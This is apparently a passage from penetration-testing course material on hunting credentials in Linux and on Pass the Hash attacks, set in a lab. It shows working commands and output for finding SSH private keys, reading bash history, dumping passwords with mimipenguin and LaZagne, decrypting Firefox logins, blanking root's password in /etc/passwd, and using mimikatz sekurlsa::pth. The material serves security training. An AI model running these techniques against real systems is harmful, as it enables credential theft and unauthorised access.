<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">cry0l1t3@unixclient:~$</span><span class="w"> </span><span class="nb">cat</span> /etc/crontab 
<span class="go">
</span><span class="gp">#</span><span class="w"> </span>/etc/crontab: system-wide crontab
<span class="gp">#</span><span class="w"> </span>Unlike any other crontab you don<span class="s1">'t have to run the `crontab'</span>
<span class="gp">#</span><span class="w"> </span><span class="nb">command </span>to <span class="nb">install </span>the new version when you edit this file
<span class="gp">#</span><span class="w"> </span>and files <span class="k">in</span> /etc/cron.d. These files also have username fields,
<span class="gp">#</span><span class="w"> </span>that none of the other crontabs <span class="k">do</span><span class="nb">.</span>
<span class="go">
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

</span><span class="gp">#</span><span class="w"> </span>Example of job definition:
<span class="gp">#</span><span class="w"> </span>.---------------- minute <span class="o">(</span>0 - 59<span class="o">)</span>
<span class="gp">#</span><span class="w"> </span>|  .------------- hour <span class="o">(</span>0 - 23<span class="o">)</span>
<span class="gp">#</span><span class="w"> </span>|  |  .---------- day of month <span class="o">(</span>1 - 31<span class="o">)</span>
<span class="gp">#</span><span class="w"> </span>|  |  |  .------- month <span class="o">(</span>1 - 12<span class="o">)</span> OR jan,feb,mar,apr ...
<span class="gp">#</span><span class="w"> </span>|  |  |  |  .---- day of week <span class="o">(</span>0 - 6<span class="o">)</span> <span class="o">(</span><span class="nv">Sunday</span><span class="o">=</span>0 or 7<span class="o">)</span> OR sun,mon,tue,wed,thu,fri,sat
<span class="gp">#</span><span class="w"> </span>|  |  |  |  |
<span class="gp">#</span><span class="w"> </span><span class="k">*</span>  <span class="k">*</span>  <span class="k">*</span>  <span class="k">*</span>  <span class="k">*</span> user-name <span class="nb">command </span>to be executed
<span class="go">17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
</span></code></pre></div></div>

<p>Credential Hunting in Linux</p>

<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">cry0l1t3@unixclient:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span> /etc/cron.<span class="k">*</span>/
<span class="go">
/etc/cron.d/:
total 28
drwxr-xr-x 1 root root  106  3. Jan 20:27 .
drwxr-xr-x 1 root root 5728  1. Feb 00:06 ..
-rw-r--r-- 1 root root  201  1. Mär 2021  e2scrub_all
-rw-r--r-- 1 root root  331  9. Jan 2021  geoipupdate
-rw-r--r-- 1 root root  607 25. Jan 2021  john
-rw-r--r-- 1 root root  589 14. Sep 2020  mdadm
-rw-r--r-- 1 root root  712 11. Mai 2020  php
-rw-r--r-- 1 root root  102 22. Feb 2021  .placeholder
-rw-r--r-- 1 root root  396  2. Feb 2021  sysstat

/etc/cron.daily/:
total 68
drwxr-xr-x 1 root root  252  6. Jan 16:24 .
drwxr-xr-x 1 root root 5728  1. Feb 00:06 ..
...SNIP...
</span></code></pre></div></div>

<h4 id="ssh-keys">SSH Keys</h4>

<p>SSH keys can be considered “access cards” for the SSH protocol used for the public key authentication mechanism. A file is generated for the client (<code class="language-plaintext highlighter-rouge">Private key</code>) and a corresponding one for the server (<code class="language-plaintext highlighter-rouge">Public key</code>). However, these are not the same, so knowing the <code class="language-plaintext highlighter-rouge">public key</code> is insufficient to find a <code class="language-plaintext highlighter-rouge">private key</code>. The <code class="language-plaintext highlighter-rouge">public key</code> can verify signatures generated by the private SSH key and thus enables automatic login to the server. Even if unauthorized persons get hold of the public key, it is almost impossible to calculate the matching private one from it. When connecting to the server using the private SSH key, the server checks whether the private key is valid and lets the client log in accordingly. Thus, passwords are no longer needed to connect via SSH.</p>

<p>Since the SSH keys can be named arbitrarily, we cannot search them for specific names. However, their format allows us to identify them uniquely because, whether public key or private key, both have unique first lines to distinguish them.</p>

<h4 id="ssh-private-keys">SSH Private Keys</h4>

<p>Credential Hunting in Linux</p>

<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">cry0l1t3@unixclient:~$</span><span class="w"> </span><span class="nb">grep</span> <span class="nt">-rnw</span> <span class="s2">"PRIVATE KEY"</span> /home/<span class="k">*</span> 2&gt;/dev/null | <span class="nb">grep</span> <span class="s2">":1"</span>
<span class="go">
/home/cry0l1t3/.ssh/internal_db:1:-----BEGIN OPENSSH PRIVATE KEY-----
</span></code></pre></div></div>

<h4 id="ssh-public-keys">SSH Public Keys</h4>

<p>Credential Hunting in Linux</p>

<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">cry0l1t3@unixclient:~$</span><span class="w"> </span><span class="nb">grep</span> <span class="nt">-rnw</span> <span class="s2">"ssh-rsa"</span> /home/<span class="k">*</span> 2&gt;/dev/null | <span class="nb">grep</span> <span class="s2">":1"</span>
<span class="go">
/home/cry0l1t3/.ssh/internal_db.pub:1:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCraK
</span></code></pre></div></div>

<hr />

<h2 id="history">History</h2>

<p>All history files provide crucial information about the current and past/historical course of processes. We are interested in the files that store users’ command history and the logs that store information about system processes.</p>

<p>In the history of the commands entered on Linux distributions that use Bash as a standard shell, we find the associated files in <code class="language-plaintext highlighter-rouge">.bash_history</code>. Nevertheless, other files like <code class="language-plaintext highlighter-rouge">.bashrc</code> or <code class="language-plaintext highlighter-rouge">.bash_profile</code> can contain important information.</p>

<h4 id="bash-history">Bash History</h4>

<p>Credential Hunting in Linux</p>

<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">cry0l1t3@unixclient:~$</span><span class="w"> </span><span class="nb">tail</span> <span class="nt">-n5</span> /home/<span class="k">*</span>/.bash<span class="k">*</span>
<span class="go">
</span><span class="gp">==&gt;</span><span class="w"> </span>/home/cry0l1t3/.bash_history &lt;<span class="o">==</span>
<span class="go">vim ~/testing.txt
vim ~/testing.txt
chmod 755 /tmp/api.py
su
/tmp/api.py cry0l1t3 6mX4UP1eWH3HXK

</span><span class="gp">==&gt;</span><span class="w"> </span>/home/cry0l1t3/.bashrc &lt;<span class="o">==</span>
<span class="go">    . /usr/share/bash-completion/bash_completion
</span><span class="gp">  elif [ -f /etc/bash_completion ];</span><span class="w"> </span><span class="k">then</span>
<span class="go">    . /etc/bash_completion
  fi
fi
</span></code></pre></div></div>

<h4 id="logs">Logs</h4>

<p>An essential concept of Linux systems is log files that are stored in text files. Many programs, especially all services and the system itself, write such files. In them, we find system errors, detect problems regarding services or follow what the system is doing in the background. The entirety of log files can be divided into four categories:</p>

<p>|<strong>Application Logs</strong>|<strong>Event Logs</strong>|<strong>Service Logs</strong>|<strong>System Logs</strong>|
|—|—|—|—|</p>

<p>Many different logs exist on the system. These can vary depending on the applications installed, but here are some of the most important ones:</p>

<table>
  <thead>
    <tr>
      <th><strong>Log File</strong></th>
      <th><strong>Description</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">/var/log/messages</code></td>
      <td>Generic system activity logs.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">/var/log/syslog</code></td>
      <td>Generic system activity logs.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">/var/log/auth.log</code></td>
      <td>(Debian) All authentication related logs.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">/var/log/secure</code></td>
      <td>(RedHat/CentOS) All authentication related logs.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">/var/log/boot.log</code></td>
      <td>Booting information.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">/var/log/dmesg</code></td>
      <td>Hardware and drivers related information and logs.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">/var/log/kern.log</code></td>
      <td>Kernel related warnings, errors and logs.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">/var/log/faillog</code></td>
      <td>Failed login attempts.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">/var/log/cron</code></td>
      <td>Information related to cron jobs.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">/var/log/mail.log</code></td>
      <td>All mail server related logs.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">/var/log/httpd</code></td>
      <td>All Apache related logs.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">/var/log/mysqld.log</code></td>
      <td>All MySQL server related logs.</td>
    </tr>
  </tbody>
</table>

<p>Covering the analysis of these log files in detail would be inefficient in this case. So at this point, we should familiarize ourselves with the individual logs, first examining them manually and understanding their formats. However, here are some strings we can use to find interesting content in the logs:</p>

<p>Credential Hunting in Linux</p>

<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">cry0l1t3@unixclient:~$</span><span class="w"> </span><span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">ls</span> /var/log/<span class="k">*</span> 2&gt;/dev/null<span class="si">)</span><span class="p">;</span><span class="k">do </span><span class="nv">GREP</span><span class="o">=</span><span class="si">$(</span><span class="nb">grep</span> <span class="s2">"accepted</span><span class="se">\|</span><span class="s2">session opened</span><span class="se">\|</span><span class="s2">session closed</span><span class="se">\|</span><span class="s2">failure</span><span class="se">\|</span><span class="s2">failed</span><span class="se">\|</span><span class="s2">ssh</span><span class="se">\|</span><span class="s2">password changed</span><span class="se">\|</span><span class="s2">new user</span><span class="se">\|</span><span class="s2">delete user</span><span class="se">\|</span><span class="s2">sudo</span><span class="se">\|</span><span class="s2">COMMAND</span><span class="se">\=\|</span><span class="s2">logs"</span> <span class="nv">$i</span> 2&gt;/dev/null<span class="si">)</span><span class="p">;</span> <span class="k">if</span> <span class="o">[[</span> <span class="nv">$GREP</span> <span class="o">]]</span><span class="p">;</span><span class="k">then </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">#### Log file: "</span> <span class="nv">$i</span><span class="p">;</span> <span class="nb">grep</span> <span class="s2">"accepted</span><span class="se">\|</span><span class="s2">session opened</span><span class="se">\|</span><span class="s2">session closed</span><span class="se">\|</span><span class="s2">failure</span><span class="se">\|</span><span class="s2">failed</span><span class="se">\|</span><span class="s2">ssh</span><span class="se">\|</span><span class="s2">password changed</span><span class="se">\|</span><span class="s2">new user</span><span class="se">\|</span><span class="s2">delete user</span><span class="se">\|</span><span class="s2">sudo</span><span class="se">\|</span><span class="s2">COMMAND</span><span class="se">\=\|</span><span class="s2">logs"</span> <span class="nv">$i</span> 2&gt;/dev/null<span class="p">;</span><span class="k">fi</span><span class="p">;</span><span class="k">done</span>
<span class="go">
</span><span class="gp">#</span><span class="c">### Log file:  /var/log/dpkg.log.1</span>
<span class="gp">2022-01-10 17:57:41 install libssh-dev:amd64 &lt;none&gt;</span><span class="w"> </span>0.9.5-1+deb11u1
<span class="go">2022-01-10 17:57:41 status half-installed libssh-dev:amd64 0.9.5-1+deb11u1
2022-01-10 17:57:41 status unpacked libssh-dev:amd64 0.9.5-1+deb11u1 
</span><span class="gp">2022-01-10 17:57:41 configure libssh-dev:amd64 0.9.5-1+deb11u1 &lt;none&gt;</span><span class="w"> 
</span><span class="go">2022-01-10 17:57:41 status unpacked libssh-dev:amd64 0.9.5-1+deb11u1 
2022-01-10 17:57:41 status half-configured libssh-dev:amd64 0.9.5-1+deb11u1
2022-01-10 17:57:41 status installed libssh-dev:amd64 0.9.5-1+deb11u1

...SNIP...
</span></code></pre></div></div>

<hr />

<h2 id="memory-and-cache">Memory and Cache</h2>

<p>Many applications and processes work with credentials needed for authentication and store them either in memory or in files so that they can be reused. For example, it may be the system-required credentials for the logged-in users. Another example is the credentials stored in the browsers, which can also be read. In order to retrieve this type of information from Linux distributions, there is a tool called <a href="https://github.com/huntergregal/mimipenguin">mimipenguin</a> that makes the whole process easier. However, this tool requires administrator/root permissions.</p>

<h4 id="memory---mimipenguin">Memory - Mimipenguin</h4>

<p>Credential Hunting in Linux</p>

<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">cry0l1t3@unixclient:~$</span><span class="w"> </span><span class="nb">sudo </span>python3 mimipenguin.py
<span class="go">[sudo] password for cry0l1t3: 

[SYSTEM - GNOME]	cry0l1t3:WLpAEXFa0SbqOHY


</span><span class="gp">cry0l1t3@unixclient:~$</span><span class="w"> </span><span class="nb">sudo </span>bash mimipenguin.sh 
<span class="go">[sudo] password for cry0l1t3: 

MimiPenguin Results:
[SYSTEM - GNOME]          cry0l1t3:WLpAEXFa0SbqOHY
</span></code></pre></div></div>

<p>An even more powerful tool we can use that was mentioned earlier in the Credential Hunting in Windows section is <code class="language-plaintext highlighter-rouge">LaZagne</code>. This tool allows us to access far more resources and extract the credentials. The passwords and hashes we can obtain come from the following sources but are not limited to:</p>

<table>
  <thead>
    <tr>
      <th> </th>
      <th> </th>
      <th> </th>
      <th> </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Wifi</td>
      <td>Wpa_supplicant</td>
      <td>Libsecret</td>
      <td>Kwallet</td>
    </tr>
    <tr>
      <td>Chromium-based</td>
      <td>CLI</td>
      <td>Mozilla</td>
      <td>Thunderbird</td>
    </tr>
    <tr>
      <td>Git</td>
      <td>Env_variable</td>
      <td>Grub</td>
      <td>Fstab</td>
    </tr>
    <tr>
      <td>AWS</td>
      <td>Filezilla</td>
      <td>Gftp</td>
      <td>SSH</td>
    </tr>
    <tr>
      <td>Apache</td>
      <td>Shadow</td>
      <td>Docker</td>
      <td>KeePass</td>
    </tr>
    <tr>
      <td>Mimipy</td>
      <td>Sessions</td>
      <td>Keyrings</td>
      <td> </td>
    </tr>
  </tbody>
</table>

<p>For example, <code class="language-plaintext highlighter-rouge">Keyrings</code> are used for secure storage and management of passwords on Linux distributions. Passwords are stored encrypted and protected with a master password. It is an OS-based password manager, which we will discuss later in another section. This way, we do not need to remember every single password and can save repeated password entries.</p>

<h4 id="memory---lazagne">Memory - LaZagne</h4>

<p>Credential Hunting in Linux</p>

<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">cry0l1t3@unixclient:~$</span><span class="w"> </span><span class="nb">sudo </span>python2.7 laZagne.py all
<span class="go">
|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Shadow passwords -----------------

[+] Hash found !!!
Login: systemd-coredump
Hash: !!:18858::::::

[+] Hash found !!!
Login: sambauser
</span><span class="gp">Hash: $</span>6<span class="nv">$wgK4tGq7Jepa</span>.V0g<span class="nv">$QkxvseL</span>.xkC3jo682xhSGoXXOGcBwPLc2CrAPugD6PYXWQlBkiwwFs7x/fhI.8negiUSPqaWyv7wC8uwsWPrx1:18862:0:99999:7:::
<span class="go">
[+] Password found !!!
Login: cry0l1t3
Password: WLpAEXFa0SbqOHY


[+] 3 passwords have been found.
For more information launch it again with the -v option

elapsed time = 3.50091600418
</span></code></pre></div></div>

<h4 id="browsers">Browsers</h4>

<p>Browsers store the passwords saved by the user in an encrypted form locally on the system to be reused. For example, the <code class="language-plaintext highlighter-rouge">Mozilla Firefox</code> browser stores the credentials encrypted in a hidden folder for the respective user. These often include the associated field names, URLs, and other valuable information.</p>

<p>For example, when we store credentials for a web page in the Firefox browser, they are encrypted and stored in <code class="language-plaintext highlighter-rouge">logins.json</code> on the system. However, this does not mean that they are safe there. Many employees store such login data in their browser without suspecting that it can easily be decrypted and used against the company.</p>

<h4 id="firefox-stored-credentials">Firefox Stored Credentials</h4>

<p>Credential Hunting in Linux</p>

<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">cry0l1t3@unixclient:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> .mozilla/firefox/ | <span class="nb">grep </span>default 
<span class="go">
drwx------ 11 cry0l1t3 cry0l1t3 4096 Jan 28 16:02 1bplpd86.default-release
drwx------  2 cry0l1t3 cry0l1t3 4096 Jan 28 13:30 lfx3lvhb.default
</span></code></pre></div></div>

<p>Credential Hunting in Linux</p>

<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">cry0l1t3@unixclient:~$</span><span class="w"> </span><span class="nb">cat</span> .mozilla/firefox/1bplpd86.default-release/logins.json | jq <span class="nb">.</span>
<span class="go">
{
  "nextId": 2,
  "logins": [
    {
      "id": 1,
      "hostname": "https://www.inlanefreight.com",
      "httpRealm": null,
      "formSubmitURL": "https://www.inlanefreight.com",
      "usernameField": "username",
      "passwordField": "password",
      "encryptedUsername": "MDoEEPgAAAA...SNIP...1liQiqBBAG/8/UpqwNlEPScm0uecyr",
      "encryptedPassword": "MEIEEPgAAAA...SNIP...FrESc4A3OOBBiyS2HR98xsmlrMCRcX2T9Pm14PMp3bpmE=",
      "guid": "{412629aa-4113-4ff9-befe-dd9b4ca388e2}",
      "encType": 1,
      "timeCreated": 1643373110869,
      "timeLastUsed": 1643373110869,
      "timePasswordChanged": 1643373110869,
      "timesUsed": 1
    }
  ],
  "potentiallyVulnerablePasswords": [],
  "dismissedBreachAlertsByLoginGUID": {},
  "version": 3
}
</span></code></pre></div></div>

<p>The tool <a href="https://github.com/unode/firefox_decrypt">Firefox Decrypt</a> is excellent for decrypting these credentials, and is updated regularly. It requires Python 3.9 to run the latest version. Otherwise, <code class="language-plaintext highlighter-rouge">Firefox Decrypt 0.7.0</code> with Python 2 must be used.</p>

<h4 id="decrypting-firefox-credentials">Decrypting Firefox Credentials</h4>

<p>Credential Hunting in Linux</p>

<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">c0derpwner@htb[/htb]$</span><span class="w"> </span>python3.9 firefox_decrypt.py
<span class="go">
Select the Mozilla profile you wish to decrypt
</span><span class="gp">1 -&gt;</span><span class="w"> </span>lfx3lvhb.default
<span class="gp">2 -&gt;</span><span class="w"> </span>1bplpd86.default-release
<span class="go">
2

Website:   https://testing.dev.inlanefreight.com
Username: 'test'
Password: 'test'

Website:   https://www.inlanefreight.com
Username: 'cry0l1t3'
Password: 'FzXUxJemKm6g2lGh'
</span></code></pre></div></div>

<p>Alternatively, <code class="language-plaintext highlighter-rouge">LaZagne</code> can also return results if the user has used the supported browser.</p>

<h4 id="browsers---lazagne">Browsers - LaZagne</h4>

<p>Credential Hunting in Linux</p>

<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">cry0l1t3@unixclient:~$</span><span class="w"> </span>python3 laZagne.py browsers
<span class="go">
|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Firefox passwords -----------------

[+] Password found !!!
URL: https://testing.dev.inlanefreight.com
Login: test
Password: test

[+] Password found !!!
URL: https://www.inlanefreight.com
Login: cry0l1t3
Password: FzXUxJemKm6g2lGh


[+] 2 passwords have been found.
For more information launch it again with the -v option

elapsed time = 0.2310788631439209
</span></code></pre></div></div>

<hr />

<h4 id="passwd-shadow--opasswd">Passwd, Shadow &amp; Opasswd</h4>

<p>Linux-based distributions can use many different authentication mechanisms. One of the most commonly used and standard mechanisms is <a href="https://web.archive.org/web/20220622215926/http://www.linux-pam.org/Linux-PAM-html/Linux-PAM_SAG.html">Pluggable Authentication Modules</a> (<code class="language-plaintext highlighter-rouge">PAM</code>). The modules used for this are called <code class="language-plaintext highlighter-rouge">pam_unix.so</code> or <code class="language-plaintext highlighter-rouge">pam_unix2.so</code> and are located in <code class="language-plaintext highlighter-rouge">/usr/lib/x86_x64-linux-gnu/security/</code> in Debian based distributions. These modules manage user information, authentication, sessions, current passwords, and old passwords. For example, if we want to change the password of our account on the Linux system with <code class="language-plaintext highlighter-rouge">passwd</code>, PAM is called, which takes the appropriate precautions and stores and handles the information accordingly.</p>

<p>The <code class="language-plaintext highlighter-rouge">pam_unix.so</code> standard module for management uses standardized API calls from the system libraries and files to update the account information. The standard files that are read, managed, and updated are <code class="language-plaintext highlighter-rouge">/etc/passwd</code> and <code class="language-plaintext highlighter-rouge">/etc/shadow</code>. PAM also has many other service modules, such as LDAP, mount, or Kerberos.</p>

<h5 id="passwd">PASSWD</h5>

<p>The <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file contains information about every existing user on the system and can be read by all users and services. Each entry in the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file identifies a user on the system. Each entry has seven fields containing a form of a database with information about the particular user, where a colon (<code class="language-plaintext highlighter-rouge">:</code>) separates the information. Accordingly, such an entry may look something like this:</p>

<h4 id="passwd-format">Passwd Format</h4>

<table>
  <thead>
    <tr>
      <th><code class="language-plaintext highlighter-rouge">cry0l1t3</code></th>
      <th><code class="language-plaintext highlighter-rouge">:</code></th>
      <th><code class="language-plaintext highlighter-rouge">x</code></th>
      <th><code class="language-plaintext highlighter-rouge">:</code></th>
      <th><code class="language-plaintext highlighter-rouge">1000</code></th>
      <th><code class="language-plaintext highlighter-rouge">:</code></th>
      <th><code class="language-plaintext highlighter-rouge">1000</code></th>
      <th><code class="language-plaintext highlighter-rouge">:</code></th>
      <th><code class="language-plaintext highlighter-rouge">cry0l1t3,,,</code></th>
      <th><code class="language-plaintext highlighter-rouge">:</code></th>
      <th><code class="language-plaintext highlighter-rouge">/home/cry0l1t3</code></th>
      <th><code class="language-plaintext highlighter-rouge">:</code></th>
      <th><code class="language-plaintext highlighter-rouge">/bin/bash</code></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Login name</td>
      <td> </td>
      <td>Password info</td>
      <td> </td>
      <td>UID</td>
      <td> </td>
      <td>GUID</td>
      <td> </td>
      <td>Full name/comments</td>
      <td> </td>
      <td>Home directory</td>
      <td> </td>
      <td>Shell</td>
    </tr>
  </tbody>
</table>

<p>The most interesting field for us is the Password information field in this section because there can be different entries here. One of the rarest cases that we may find only on very old systems is the hash of the encrypted password in this field. Modern systems have the hash values stored in the <code class="language-plaintext highlighter-rouge">/etc/shadow</code> file, which we will come back to later. Nevertheless, <code class="language-plaintext highlighter-rouge">/etc/passwd</code> is readable system-wide, giving attackers the possibility to crack the passwords if hashes are stored here.</p>

<h4 id="editing-etcpasswd---before">Editing /etc/passwd - Before</h4>

<p>Passwd, Shadow &amp; Opasswd</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root:x:0:0:root:/root:/bin/bash
</code></pre></div></div>

<h4 id="editing-etcpasswd---after">Editing /etc/passwd - After</h4>

<p>Passwd, Shadow &amp; Opasswd</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root::0:0:root:/root:/bin/bash
</code></pre></div></div>

<h4 id="root-without-password">Root without Password</h4>

<p>Passwd, Shadow &amp; Opasswd</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>cry0l1t3@parrot]─[~]<span class="nv">$ </span><span class="nb">head</span> <span class="nt">-n</span> 1 /etc/passwd

root::0:0:root:/root:/bin/bash


<span class="o">[</span>cry0l1t3@parrot]─[~]<span class="nv">$ </span>su

<span class="o">[</span>root@parrot]─[/home/cry0l1t3]#
</code></pre></div></div>

<h2 id="shadow-file">Shadow File</h2>

<p>Since reading the password hash values can put the entire system in danger, the file <code class="language-plaintext highlighter-rouge">/etc/shadow</code> was developed, which has a similar format to <code class="language-plaintext highlighter-rouge">/etc/passwd</code> but is only responsible for passwords and their management. It contains all the password information for the created users. For example, if there is no entry in the <code class="language-plaintext highlighter-rouge">/etc/shadow</code> file for a user in <code class="language-plaintext highlighter-rouge">/etc/passwd</code>, the user is considered invalid. The <code class="language-plaintext highlighter-rouge">/etc/shadow</code> file is also only readable by users who have administrator rights. The format of this file is divided into <code class="language-plaintext highlighter-rouge">nine fields</code>:</p>

<p>If the password field contains a character, such as <code class="language-plaintext highlighter-rouge">!</code> or <code class="language-plaintext highlighter-rouge">*</code>, the user cannot log in with a Unix password. However, other authentication methods for logging in, such as Kerberos or key-based authentication, can still be used. The same case applies if the <code class="language-plaintext highlighter-rouge">encrypted password</code> field is empty. This means that no password is required for the login. However, it can lead to specific programs denying access to functions. The <code class="language-plaintext highlighter-rouge">encrypted password</code> also has a particular format by which we can also find out some information:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">$&lt;type&gt;$&lt;salt&gt;$&lt;hashed&gt;</code></li>
</ul>

<p>As we can see here, the encrypted passwords are divided into three parts. The types of encryption allow us to distinguish between the following:</p>

<h4 id="algorithm-types">Algorithm Types</h4>

<ul>
  <li><code class="language-plaintext highlighter-rouge">$1$</code> – MD5</li>
  <li><code class="language-plaintext highlighter-rouge">$2a$</code> – Blowfish</li>
  <li><code class="language-plaintext highlighter-rouge">$2y$</code> – Eksblowfish</li>
  <li><code class="language-plaintext highlighter-rouge">$5$</code> – SHA-256</li>
  <li><code class="language-plaintext highlighter-rouge">$6$</code> – SHA-512</li>
</ul>

<p>By default, the SHA-512 (<code class="language-plaintext highlighter-rouge">$6$</code>) encryption method is used on the latest Linux distributions. We will also find the other encryption methods that we can then try to crack on older systems. We will discuss how the cracking works in a bit.</p>

<hr />

<h1 id="pass-the-hash-pth">Pass the Hash (PtH)</h1>

<p>A <a href="https://attack.mitre.org/techniques/T1550/002/">Pass the Hash (PtH)</a> attack is a technique where an attacker uses a password hash instead of the plain text password for authentication. The attacker doesn’t need to decrypt the hash to obtain a plaintext password. PtH attacks exploit the authentication protocol, as the password hash remains static for every session until the password is changed.</p>

<p>As discussed in the previous sections, the attacker must have administrative privileges or particular privileges on the target machine to obtain a password hash. Hashes can be obtained in several ways, including:</p>

<ul>
  <li>Dumping the local SAM database from a compromised host.</li>
  <li>Extracting hashes from the NTDS database (ntds.dit) on a Domain Controller.</li>
  <li>Pulling the hashes from memory (lsass.exe).</li>
</ul>

<p>Let’s assume we obtain the password hash (<code class="language-plaintext highlighter-rouge">64F12CDDAA88057E06A81B54E73B949B</code>) for the account <code class="language-plaintext highlighter-rouge">julio</code> from the domain <code class="language-plaintext highlighter-rouge">inlanefreight.htb</code>. Let’s see how we can perform Pass the Hash attacks from Windows and Linux machines.</p>

<p><strong>Note:</strong> The tools we will be using are located in the C:\tools directory on the target host. Once you start the machine and complete the exercises, you can use the tools in that directory. This lab contains two machines, you will have access to one (MS01), and from there, you will connect to the second machine (DC01).</p>

<hr />

<h2 id="windows-ntlm-introduction">Windows NTLM Introduction</h2>

<p>Microsoft’s <a href="https://learn.microsoft.com/en-us/windows-server/security/kerberos/ntlm-overview">Windows New Technology LAN Manager (NTLM)</a> is a set of security protocols that authenticates users’ identities while also protecting the integrity and confidentiality of their data. NTLM is a single sign-on (SSO) solution that uses a challenge-response protocol to verify the user’s identity without having them provide a password.</p>

<p>Despite its known flaws, NTLM is still commonly used to ensure compatibility with legacy clients and servers, even on modern systems. While Microsoft continues to support NTLM, Kerberos has taken over as the default authentication mechanism in Windows 2000 and subsequent Active Directory (AD) domains.</p>

<p>With NTLM, passwords stored on the server and domain controller are not “salted,” which means that an adversary with a password hash can authenticate a session without knowing the original password. We call this a <code class="language-plaintext highlighter-rouge">Pass the Hash (PtH) Attack</code>.</p>

<hr />

<h2 id="pass-the-hash-with-mimikatz-windows">Pass the Hash with Mimikatz (Windows)</h2>

<p>The first tool we will use to perform a Pass the Hash attack is <a href="https://github.com/gentilkiwi">Mimikatz</a>. Mimikatz has a module named <code class="language-plaintext highlighter-rouge">sekurlsa::pth</code> that allows us to perform a Pass the Hash attack by starting a process using the hash of the user’s password. To use this module, we will need the following:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">/user</code> - The user name we want to impersonate.</li>
  <li><code class="language-plaintext highlighter-rouge">/rc4</code> or <code class="language-plaintext highlighter-rouge">/NTLM</code> - NTLM hash of the user’s password.</li>
  <li><code class="language-plaintext highlighter-rouge">/domain</code> - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.).</li>
  <li><code class="language-plaintext highlighter-rouge">/run</code> - The program we want to run with the user’s context (if not specified, it will launch cmd.exe).</li>
</ul>

<h4 id="pass-the-hash-from-windows-using-mimikatz">Pass the Hash from Windows Using Mimikatz:</h4>

<p>Pass the Hash (PtH)</p>

<pre><code class="language-cmd-session">c:\tools&gt; mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
user    : julio
domain  : inlanefreight.htb
program : cmd.exe
impers. : no
NTLM    : 64F12CDDAA88057E06A81B54E73B949B
  |  PID  8404
  |  TID  4268
  |  LSA Process was already R/W
  |  LUID 0 ; 5218172 (00000000:004f9f7c)
  \_ msv1_0   - data copy @ 0000028FC91AB510 : OK !
  \_ kerberos - data copy @ 0000028FC964F288
   \_ des_cbc_md4       -&gt; null
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ *Password replace @ 0000028FC9673AE8 (32) -&gt; null
</code></pre>

<p>Now we can use cmd.exe to execute commands in the user’s context. For this example, <code class="language-plaintext highlighter-rouge">julio</code> can connect to a shared folder named <code class="language-plaintext highlighter-rouge">julio</code> on the DC.</p>

<p><img src="https://academy.hackthebox.com/storage/modules/147/pth_julio.jpg" alt="Command prompt showing mimikatz execution with privilege escalation and directory listing commands." /></p>

<hr />

<h2 id="pass-the-hash-with-powershell-invoke-thehash-windows">Pass the Hash with PowerShell Invoke-TheHash (Windows)</h2>

